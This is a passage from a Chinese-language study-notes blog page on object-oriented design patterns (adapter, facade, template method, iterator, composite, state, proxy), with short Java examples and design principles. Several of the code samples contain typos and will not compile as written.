  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TwoWayAdapterDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ClassA</span> <span class="variable">classA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassA</span>();</span><br><span class="line">        <span class="type">ClassB</span> <span class="variable">classB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassB</span>();</span><br><span class="line">        <span class="type">TwoWayAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TwoWayAdapter</span>(classA, classB);</span><br><span class="line"></span><br><span class="line">        adapter.methodA(); <span class="comment">// 调用ClassB的methodB()</span></span><br><span class="line">        adapter.methodB(); <span class="comment">// 调用ClassA的methodA()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102111350165.png" alt="image-20250102111350165"></p>
<h3 id="外观模式-Facade-Pattern"><a href="#外观模式-Facade-Pattern" class="headerlink" title="外观模式 Facade Pattern"></a>外观模式 Facade Pattern</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241225002249848.png" alt="image-20241225002249848" style="zoom:50%;" />

<p>外观模式提供了一个统一的接口，用来访问子系统中的一群接口。外观定义了一个高层接口，让子系统更容易使用。</p>
<p>某系统需要提供一个文件加密模块，加密流程包括：读源文件、加密、保存加密文件。读取文件和保存文件使用流来实现，三个业务相对独立，封装在不同的类中；现在需要提供一个统一的加密外观类，用户可以直接使用该加密外观类完成文件的读取、加密和保存三个操作。使用Facade模式来设计。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/v2-99d2b76b2d80f665312d6c314b6286a1_1440w.jpg" alt="img" style="zoom:67%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">readfile</span>｛</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">read</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">｝</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">codefile</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">code</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">savefile</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span>  <span class="title class_">codeFacade</span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">readfile</span> <span class="variable">rf</span> <span class="operator">=</span> readfile();</span><br><span class="line">	<span class="keyword">private</span> <span class="type">codefile</span> <span class="variable">cf</span> <span class="operator">=</span> codefile();</span><br><span class="line">	<span class="keyword">private</span> <span class="type">savefile</span> <span class="variable">sf</span> <span class="operator">=</span> savefile():</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jiami</span><span class="params">()</span>&#123;</span><br><span class="line">		rf.read();</span><br><span class="line">		cf.code();</span><br><span class="line">		sf.save():</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102111519102.png" alt="image-20250102111519102"></p>
<h4 id="迪米特法则-最少知识原则"><a href="#迪米特法则-最少知识原则" class="headerlink" title="迪米特法则&#x2F;最少知识原则"></a>迪米特法则&#x2F;最少知识原则</h4><p>——一个对象应当对其他对象有尽可能少的了解。</p>
<ul>
<li>这个原则鼓励对象之间的松耦合，这样可以降低系统的复杂性，提高模块的独立性。</li>
<li>在实际编程中，这意味着一个对象不应该调用另一个对象的方法来获取数据，而是应该通过自己的方法来获取。</li>
<li>这个原则有助于降低类之间的依赖性，从而使系统更容易维护和扩展。</li>
</ul>
<h3 id="模板方法模式-Template-Method-Pattern"><a href="#模板方法模式-Template-Method-Pattern" class="headerlink" title="模板方法模式 Template Method Pattern"></a>模板方法模式 Template Method Pattern</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241225002938681.png" alt="image-20241225002938681" style="zoom:50%;" />

<p>模板方法模式在一个方法中定义一个算法的骨架，而将一些步骤延迟到子类中。模板方法使得子类可以在不改变算法结构的情况下，重新定义算法中的某些步骤。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractClass</span> &#123;</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">templateMethod</span><span class="params">()</span>&#123;	<span class="comment">//模板方法为final，不希望子类覆写</span></span><br><span class="line">		primitiveOperation1();</span><br><span class="line">		primitiveOperation2();</span><br><span class="line">		concreteOperation();</span><br><span class="line">        hook();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">primitiveOperation1</span><span class="params">()</span>;	<span class="comment">//子类需要实现这两个抽象方法</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">primitiveOperation2</span><span class="params">()</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">concreteOperation</span><span class="params">()</span>&#123;	<span class="comment">//具体的方法为final</span></span><br><span class="line">		<span class="comment">// 这里是实现</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">hook</span><span class="params">()</span>&#123;&#125;	<span class="comment">//勾子函数，子类可看情况进行覆盖</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102111826034.png" alt="image-20250102111826034"></p>
<h4 id="好莱坞原则"><a href="#好莱坞原则" class="headerlink" title="好莱坞原则"></a>好莱坞原则</h4><p>——别调用我们，我们会调用你。</p>
<ul>
<li>它用于控制何时以及如何对象间的交互发生。</li>
<li>在这个模式下，<strong>高层次的组件告诉低层次的组件“如果有什么重要的事情发生，我会通知你”，而不是低层次组件向高层次组件发起通讯。</strong></li>
<li>这个原则常用于框架设计，其中框架控制流程，而用户自定义的部分则等待被框架调用。</li>
<li>这样可以提供一个明确的协议来决定何时以及如何用户的代码被执行。</li>
</ul>
<h3 id="迭代器模式-Iterator-Pattern"><a href="#迭代器模式-Iterator-Pattern" class="headerlink" title="迭代器模式 Iterator Pattern"></a>迭代器模式 Iterator Pattern</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241225005843802.png" alt="image-20241225005843802"></p>
<p>迭代器模式提供一种方法顺序访问一个聚合对象中的各个元素，而又不暴露其内部的表示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Aggregate</span>&#123;</span><br><span class="line">	Iterator <span class="title function_">createIterator</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteAggregate</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Item[] items;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Iterator <span class="title function_">createIterator</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteIterator</span>(items);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteIterator</span>&lt;Item&gt; <span class="keyword">implements</span> <span class="title class_">Iterator</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Item[] items;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConcreteIterator</span><span class="params">(Item items)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.items = items;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> items[position++];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hashNext</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> position &lt; items.length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Aggregate</span> <span class="variable">aggregate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcreteAggregate</span>();</span><br><span class="line">        Iterator&lt;Integer&gt; iterator  = aggregate.createIterator();</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102112235113.png" alt="image-20250102112235113"></p>
<h3 id="组合模式-Composite-Pattern"><a href="#组合模式-Composite-Pattern" class="headerlink" title="组合模式 Composite Pattern"></a>组合模式 Composite Pattern</h3><p>组合模式允许你将对象组合成树形结构来表现“整体&#x2F;部分”层次结构。组合能让客户以一致的方式处理个别对象以及对象组合。</p>
<h4 id="透明组合"><a href="#透明组合" class="headerlink" title="透明组合"></a>透明组合</h4><p>所有组件（叶子节点和组合节点）共享一个统一的接口；接口中定义了组合节点特有的操作（如 <code>add</code> 和 <code>remove</code> 方法），<strong>叶子节点也会继承这些操作</strong>。</p>
<p>pros:</p>
<p>客户端代码对组合结构一视同仁（透明）； </p>
<p>不需要区分叶子节点和组合节点，简化了客户端逻辑。  </p>
<p>cons:</p>
<p><strong>叶子节点不需要也不能实现组合特有的操作（如</strong> <code>add</code> <strong>和</strong> <code>remove</code><strong>），但仍被迫继承这些方法</strong>；</p>
<p>对于叶子节点，调用这些方法可能会抛出异常或什么都不做，违反了接口隔离原则（ISP）。   </p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241225011432769.png" alt="image-20241225011432769" style="zoom:67%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Component</span>&#123; <span class="comment">//牺牲单一职责原则换取透明性，这样就不用考虑是叶子还是组合节点</span></span><br><span class="line">	<span class="keyword">protected</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Component</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        print(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> level)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Componet componet)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Component componet)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Composite</span> <span class="keyword">extends</span> <span class="title class_">Componet</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Component&gt; childs;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Composite</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">        childs = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> level)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;level;i++)</span><br><span class="line">            System.out.println(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Composite: &quot;</span> + name);</span><br><span class="line">        <span class="keyword">for</span> (Componet component:childs)</span><br><span class="line">            component.print(level+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Component component)</span>&#123;</span><br><span class="line">        child.add(component);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Component component)</span>&#123;</span><br><span class="line">        child.remove(component);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Leaf</span> <span class="keyword">extends</span> <span class="title class_">Componet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Leaf</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> level)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;level;i++)</span><br><span class="line">           System.out.println(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Leaf: &quot;</span> + name);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Component component)</span>&#123;	</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOpeartionException</span>();	</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Component component)</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOpeartionException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="安全组合"><a href="#安全组合" class="headerlink" title="安全组合"></a>安全组合</h4><p><strong>将叶子节点和组合节点的接口分开：组件基类只定义通用操作（如 operation），组合特有的操作（如 add 和 remove）仅在组合节点中定义；叶子节点不会暴露组合特有的操作。</strong></p>
<p>pros:</p>
<p>更符合接口隔离原则（ISP），叶子节点只包含必要的操作。</p>
<p>避免客户端调用叶子节点上不支持的方法。</p>
<p>cons：</p>
<p>客户端需要区分叶子节点和组合节点，可能需要额外的类型检查（如通过 dynamic_cast 或其他机制）。</p>
<p>杀毒软件（AntiVirus）既能对系统中不同类型的文件 TextFile、ImageFile、VideoFile杀毒，也能对文件夹的杀毒，对文件夹杀毒就是对其中所包含文件的杀毒。使用Composite模式来设计。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241225193013767.png" alt="image-20241225193013767"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">MyElement</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">killvirus</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TextFile</span> <span class="keyword">extends</span> <span class="title class_">MyElement</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">killvirus</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;对text文件进行杀毒&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ImageFile</span> <span class="keyword">extends</span> <span class="title class_">MyElement</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">killvirus</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;对image文件进行杀毒&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VideoFile</span> <span class="keyword">extends</span> <span class="title class_">MyElement</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">killvirus</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;对video文件进行杀毒&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">File</span> <span class="keyword">extends</span> <span class="title class_">MyElement</span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">ArrayList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(MyElement element)</span>&#123;</span><br><span class="line">		list.add(element);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(MyElement element)</span>&#123;</span><br><span class="line">		list.remove(element);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">killvirus</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(Object object:list)&#123;</span><br><span class="line">			((MyElement).object).killvirus();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102112609925.png" alt="image-20250102112609925"></p>
<h3 id="状态模式-State-Pattern"><a href="#状态模式-State-Pattern" class="headerlink" title="状态模式 State Pattern"></a>状态模式 State Pattern</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102113219739.png" alt="image-20250102113219739"></p>
<p>状态模式允许对象在内部状态改变时改变它的行为，对象看起来好像修改了它的类。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241225180740505.png" alt="image-20241225180740505" style="zoom:50%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">State</span>&#123;</span><br><span class="line">	<span class="comment">//投入25分钱</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">insertQuarter</span><span class="params">()</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//退回25分钱</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">ejectQuarter</span><span class="params">()</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//转动曲柄</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">turnCrank</span><span class="params">()</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//发放糖果</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">dispense</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HasQuarterState</span> <span class="keyword">implements</span> <span class="title class_">State</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> GumballMachine gumballMachine;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">HasQuarterState</span><span class="params">(GumballMachine gumballMachine)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.gumballMachine = gumballMachine;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertQuarter</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;You can&#x27;t insert another quarter&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ejectQuarter</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Quarter returned&quot;</span>);</span><br><span class="line">		gumballMachine.setState(guamballMachine.getNoQuarterState());</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">turnCrank</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;You turned...&quot;</span>);</span><br><span class="line">		gumballMachine.setState(guamballMachine.getSoldState());</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispense</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;No gumball dispensed&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GumballMachine</span>&#123;</span><br><span class="line">	<span class="keyword">private</span> State soldOutState;</span><br><span class="line">	<span class="keyword">private</span> State noQuarterState;</span><br><span class="line">	<span class="keyword">private</span> State hashQuarterState;</span><br><span class="line">	<span class="keyword">private</span> State soldState;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> State state;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">GumballMachine</span><span class="params">(<span class="type">int</span> numberGumballs)</span>&#123;</span><br><span class="line">		count = numberGumballs;</span><br><span class="line">		soldOutState = <span class="keyword">new</span> <span class="title class_">SoldOutState</span>(<span class="built_in">this</span>);</span><br><span class="line">		noQuarterState = <span class="keyword">new</span> <span class="title class_">NoQuarterState</span>(<span class="built_in">this</span>);</span><br><span class="line">		hasQuarterState = <span class="keyword">new</span> <span class="title class_">HasQuarterState</span>(<span class="built_in">this</span>);</span><br><span class="line">		soldState = <span class="keyword">new</span> <span class="title class_">SoldState</span>(<span class="built_in">this</span>)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (numberGumballs &gt; <span class="number">0</span>)&#123;</span><br><span class="line">			state = noQuarterState;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			state = soldOutState;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertQuarter</span><span class="params">()</span>&#123;</span><br><span class="line">		state.insertQuarter();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ejectQuarter</span><span class="params">()</span>&#123;</span><br><span class="line">		state.ejectQuarter();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">turnCrank</span><span class="params">()</span>&#123;</span><br><span class="line">		state.turnCrank();</span><br><span class="line">		state.dispense();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setState</span><span class="params">(State)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.state = state;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">releaseBall</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;A gumball comes rolling out the slot...&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (count != <span class="number">0</span>)</span><br><span class="line">			count = -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> State get...State()&#123;</span><br><span class="line">		<span class="keyword">return</span> ...State;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCount</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102113108767.png" alt="image-20250102113108767"></p>
<h3 id="代理模式-Proxy-Pattern"><a href="#代理模式-Proxy-Pattern" class="headerlink" title="代理模式 Proxy Pattern"></a>代理模式 Proxy Pattern</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102122941388.png" alt="image-20250102122941388"></p>
<p>代理模式为另一个对象提供一个替身或占位符以控制对这个对象的访问。</p>
<p>使用代理模式创建代表，让代表对象控制某对象的访问，被代理的对象可以是远程的对象、创建开销大的对象或者需要安全控制的对象。</p>
<h4 id="远程代理"><a href="#远程代理" class="headerlink" title="远程代理"></a>远程代理</h4><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241226120307380.png" alt="image-20241226120307380"></p>
<p>Java RMI</p>
<h4 id="虚拟代理"><a href="#虚拟代理" class="headerlink" title="虚拟代理"></a>虚拟代理</h4><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241226120242531.png" alt="image-20241226120242531"></p>
<p>以下是一个虚拟代理的实现，模拟了图片延迟加载的情况下使用与图片大小相等的临时内容去替换原始图片，直到图片加载完成才将图片显示出来。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Image</span> &#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">showImage</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HighResolutionImage</span> <span class="keyword">implements</span> <span class="title class_">Image</span>&#123;</span><br><span class="line">	<span class="keyword">private</span> URL imageURL;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> startTime;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> height;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> width;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> height;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getWidth</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> width;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HighResolutionImage</span><span class="params">(URL imageURL)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.imageURL = imageURL;</span><br><span class="line">        <span class="built_in">this</span>.startTime = System.currentTimeMillis();</span><br><span class="line">        <span class="built_in">this</span>.width = <span class="number">600</span>;</span><br><span class="line">        <span class="built_in">this</span>.height = <span class="number">600</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isLoad</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 模拟图片加载，延迟3s完成</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">endTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">return</span> endTime - startTime &gt; <span class="number">3000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showImage</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Real Image: &quot;</span> + imageURL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title 